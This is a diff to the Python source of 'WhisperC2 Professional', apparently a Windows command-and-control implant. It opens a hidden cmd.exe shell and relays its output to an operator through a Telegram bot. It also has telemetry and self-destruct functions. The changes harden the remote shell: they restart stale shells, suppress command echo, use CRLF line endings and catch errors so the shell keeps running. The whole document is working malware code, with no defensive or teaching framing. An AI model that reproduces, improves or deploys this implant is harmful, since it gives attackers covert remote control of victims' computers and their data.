@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – PID‑Based Override + Auto‑Topic Recreation
+# WhisperC2 Professional – Shell‑Hardened (cmd.exe, echo off, robust)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -129,7 +129,7 @@ def send_telemetry(topic_id, status: str) -> bool:
         return False
 
 # -----------------------------------------------------------------------------
-# Topic management (auto‑recreate if deleted)
+# Topic management
 # -----------------------------------------------------------------------------
 def load_topic_id() -> int | None:
     if TOPIC_ID_FILE.exists():
@@ -211,7 +211,7 @@ def self_destruct(topic_id) -> None:
         pass
 
 # -----------------------------------------------------------------------------
-# Interactive shell
+# Interactive shell (cmd.exe, echo off, hot‑plug resilient)
 # -----------------------------------------------------------------------------
 shell_active = False
 shell_process = None
@@ -221,8 +221,9 @@ shell_lock = threading.Lock()
 def spawn_shell(topic_id) -> bool:
     global shell_active, shell_process, _shell_topic_id
     with shell_lock:
+        # If a shell is already active, kill it (stale) and restart cleanly
         if shell_active:
-            return True
+            kill_shell()
         _shell_topic_id = topic_id
         try:
             shell_process = subprocess.Popen(
@@ -235,6 +236,8 @@ def spawn_shell(topic_id) -> bool:
                 creationflags=0x08000000
             )
             shell_active = True
+            # Suppress command echo immediately
+            write_shell("@echo off")
             threading.Thread(target=shell_reader, daemon=True).start()
             log("Interactive shell spawned")
             return True
@@ -246,11 +249,16 @@ def shell_reader() -> None:
     global shell_active
     while shell_active and shell_process and shell_process.stdout:
         if shell_process.poll() is not None:
+            log("Shell process died")
             break
         try:
             line = shell_process.stdout.readline()
             if not line:
                 break
+            # Strip trailing whitespace but keep the content
+            line = line.rstrip('\n\r')
+            if not line:
+                continue
             safe = line.replace('```', "'''")
             for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
                 try:
@@ -259,10 +267,17 @@ def shell_reader() -> None:
                                      message_thread_id=_shell_topic_id,
                                      parse_mode='Markdown')
                     time.sleep(0.25)
-                except:
+                except Exception:
+                    # Don't break on a single send failure
                     pass
-        except:
+        except (IOError, OSError) as e:
+            log(f"Shell pipe error: {e}")
             break
+        except Exception as e:
+            log(f"Shell read error: {e}")
+            # Continue unless process has died
+            if shell_process and shell_process.poll() is not None:
+                break
     kill_shell()
 
 def kill_shell() -> None:
@@ -278,7 +293,7 @@ def kill_shell() -> None:
 def write_shell(cmd: str) -> None:
     if shell_active and shell_process and shell_process.stdin:
         try:
-            shell_process.stdin.write(cmd + "\n")
+            shell_process.stdin.write(cmd + "\r\n")
             shell_process.stdin.flush()
         except:
             kill_shell()
